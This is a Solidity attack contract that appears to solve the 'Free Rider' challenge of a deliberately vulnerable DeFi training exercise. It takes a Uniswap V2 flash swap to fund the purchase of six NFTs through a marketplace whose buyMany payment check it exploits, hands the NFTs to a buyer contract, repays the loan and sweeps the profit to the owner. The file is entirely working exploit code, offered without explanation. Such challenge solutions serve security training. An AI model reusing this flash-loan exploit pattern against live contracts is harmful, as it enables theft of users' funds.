pragma solidity ^0.8.0;

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./FreeRiderBuyer.sol";
import "./FreeRiderNFTMarketplace.sol";
import "../DamnValuableNFT.sol";

interface IWETH9 {
    function withdraw(uint wad) external;
    function deposit() external payable;
    function transfer(address dst, uint wad) external returns (bool);
}

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    IWETH9 private weth;
    IUniswapV2Pair private pair;
    IUniswapV2Factory private factory;
    FreeRiderBuyer private buyer;
    FreeRiderNFTMarketplace private marketplace;
    address private owner;

    constructor(IWETH9 _weth, IUniswapV2Pair _pair, IUniswapV2Factory _factory, FreeRiderBuyer _buyer, FreeRiderNFTMarketplace _marketplace) {
        owner = msg.sender;
        weth = _weth;
        pair = _pair;
        factory = _factory;
        buyer = _buyer;
        marketplace = _marketplace;
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
        assert(msg.sender == IUniswapV2Factory(factory).getPair(token0, token1)); // ensure that msg.sender is a V2 pair
        uint256 amountETH = token0 == address(weth) ? amount0 : amount1;

        // convert all weth -> eth
        weth.withdraw(amountETH);

        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        marketplace.buyMany{ value: 15 ether }(tokenIds);

        for (uint256 i = 0; i < 6; i++) {
            DamnValuableNFT(marketplace.token()).safeTransferFrom(address(this), address(buyer), i);
        }

        // repaying the loan in weth (0.03%)
        uint256 fee = amountETH * 300 / 10_000;
        uint256 repayment = amountETH + fee;

        weth.deposit{value:repayment}();
        weth.transfer(msg.sender, repayment);

        owner.call{value: address(this).balance}("");
    }

    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    )
    external
    override
    returns (bytes4) 
    {
        return IERC721Receiver.onERC721Received.selector;
    }

}
